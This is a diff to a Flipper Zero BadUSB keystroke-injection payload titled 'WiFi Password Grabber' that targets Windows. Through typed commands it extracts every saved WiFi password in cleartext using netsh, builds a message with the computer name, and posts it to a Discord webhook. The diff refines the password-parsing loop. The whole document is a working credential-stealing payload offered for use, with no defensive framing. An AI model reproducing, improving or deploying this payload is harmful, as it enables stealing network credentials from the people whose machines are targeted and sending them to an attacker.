@@ -1,7 +1,6 @@
 REM Title: Flipper Zero BadUSB Payload - WiFi Password Grabber
 REM Author: Angrido
 REM Target: Windows
-
 DELAY 2000
 GUI r
 DELAY 500
@@ -13,19 +12,26 @@ DELAY 2000
 LEFT
 DELAY 500
 ENTER
-
-STRING $message = "WiFi Passwords:"
+STRING $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
 ENTER
-
-STRING $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenuto chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ WIFI_NAME=$name;PASSWORD=$pass }}
+STRING $message = "WiFi Passwords:`n"
 ENTER
-
-STRING foreach ($profile in $wifiProfiles) {
+STRING foreach ($profileName in $wifiProfiles) {
 ENTER
-STRING     $message += "SSID: $($profile.WIFI_NAME) - Password: $($profile.PASSWORD) "
+STRING     $profileInfo = (netsh wlan show profile name=""$profileName"" key=clear)
+ENTER
+STRING     $passwordLine = $profileInfo | Select-String "Key Content|Contenuto chiave"
+ENTER
+STRING     if ($passwordLine) {
+ENTER
+STRING         $password = ($passwordLine -split ":")[1].Trim()
+ENTER
+STRING         $message += "$($profileName): $($password)`n"
+ENTER
+STRING     }
 ENTER
 STRING }
-
+ENTER
 STRING $Body = @{
 ENTER
 STRING     'username' = $env:COMPUTERNAME
@@ -34,12 +40,9 @@ STRING     'content' = $message
 ENTER
 STRING }
 ENTER
-
 STRING $webhook = "YOUR_DISCORD_WEBHOOK"
 ENTER
-
 STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
 ENTER
-
 STRING exit
 ENTER
